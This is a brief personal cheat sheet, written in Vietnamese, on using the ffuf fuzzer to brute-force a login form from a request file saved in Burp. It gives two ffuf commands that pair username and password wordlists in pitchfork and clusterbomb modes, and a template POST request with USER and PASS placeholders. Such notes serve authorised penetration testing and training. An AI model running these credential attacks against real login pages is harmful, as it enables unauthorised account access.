---
title: "fuff personal cheetsheet"
---

**1-dùng fuf với file request có sẵn trên burp để có thể brute force**
```
ffuf -request login.txt -request-proto http \
     -w wordlist_username.txt:USER \
     -w wordlist_password.txt:PASS \
     -mode pitchfork \
     -fr "Invalid username or password."

Trong file `login.txt`, bạn đặt keyword vào đúng vị trí:
```


-chọn mode
```
ffuf -request login.txt -request-proto http \
     -w wordlist_username.txt:USER \
     -w wordlist_password.txt:PASS \
     -mode clusterbomb \
     -fr "Invalid username or password."
```

```text

POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
username=USER&password=PASS

```
